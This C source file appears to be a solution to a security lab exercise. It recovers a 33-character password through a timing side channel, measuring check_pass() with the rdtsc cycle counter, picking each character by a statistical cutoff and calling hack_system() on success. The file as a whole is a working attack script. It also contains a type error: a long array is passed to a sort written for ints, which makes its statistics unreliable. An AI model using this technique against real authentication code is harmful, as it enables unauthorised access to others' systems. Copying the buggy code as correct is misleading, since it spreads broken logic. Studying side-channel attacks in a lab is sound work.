#include <stdio.h>
#include <string.h>
#include <unistd.h>

// include our "system" header
#include "sysapp.h"

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

#define FIRST_CHAR  21
#define LAST_CHAR   127
#define NUM_TRIALS  5

/* Sort the dataset (insertion sort is fine, dataset is relatively small) */
void sort(int arr[], int n)
{
    int i, key, j;
    for (i = 1; i < n; i++) {
        key = arr[i];
        j = i - 1;

        /* Move elements of arr[0..i-1], that are
          greater than key, to one position ahead
          of their current position */
        while (j >= 0 && arr[j] > key) {
            arr[j + 1] = arr[j];
            j = j - 1;
        }
        arr[j + 1] = key;
    }
}

/* Take the mean of the interquartile range */
long iqr_mean(long time_trials[], int len) {
  int median = len / 2;
  int q1 = median / 2;
  int q3 = (len - median) / 2 + 1;

  long sum = 0;

  for (int i = q1; i < q3; i++) {
    sum += time_trials[i];
  }

  return sum / (q3 - q1);
}

/*
 * In 1 / (num_possible_chars) of trials, the correct character was encountered
 *
 * Therefore, num_correct_trials = number of trials / (num_possible_chars)
 *
 * Take the upper (num_correct_trials) of times and take the average of them.
 */
long correct_mean(long time_trials[], int len) {
  long num_correct_found = len / (LAST_CHAR - FIRST_CHAR);

  long sum = 0;

  for (int i = len - num_correct_found; i < len; i++) {
    sum += time_trials[i];
  }

  return sum / num_correct_found;
}

int main(int argc, char **argv) {
    char guess[33];

    // set guess to zeros
    bzero(guess, sizeof(guess));

    int time_arr_len = (LAST_CHAR - FIRST_CHAR) * NUM_TRIALS;
    long time_arr[time_arr_len];

    for (int i = 0; i < 33; i++) {

      /*
       * Iterate through all possible ascii characters (TIME_TRIALS) many times.
       *
       * Record the time it takes to complete each trial in the time_arr;
       */
      for (int j = 0; j < NUM_TRIALS; j++) {
        for (char guess_char = FIRST_CHAR; guess_char < LAST_CHAR; guess_char++) {
          guess[i] = guess_char;
          long start = rdtsc();
          int result = check_pass(guess);
          long time_spent = rdtsc() - start;
          time_arr[j*(LAST_CHAR - FIRST_CHAR) + (guess_char - FIRST_CHAR)] = time_spent;
        }
      }

      // Sort the time_arr so statistics can be performed on it
      sort(time_arr, time_arr_len);

      // Get the mean of the interquartile range, a good way to get a middle value
      long avg_case = iqr_mean(time_arr, time_arr_len);

      // Take the mean of the upper trials (refer to correct_mean for more info)
      long correct_case = correct_mean(time_arr, time_arr_len);

      // calculate the cutoff to determine the difference between a correct guess and incorrect guess
      long cutoff = avg_case + (correct_case - avg_case) / 3;

      for (char guess_char = FIRST_CHAR; guess_char < LAST_CHAR; guess_char++) {
        guess[i] = guess_char;

        long start = rdtsc();
        int result = check_pass(guess);
        long time_spent = rdtsc() - start;

        if (time_spent > cutoff) {

          if (i == 32) {
            hack_system(guess);
          }

          break;
        }

      }

    }

    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};

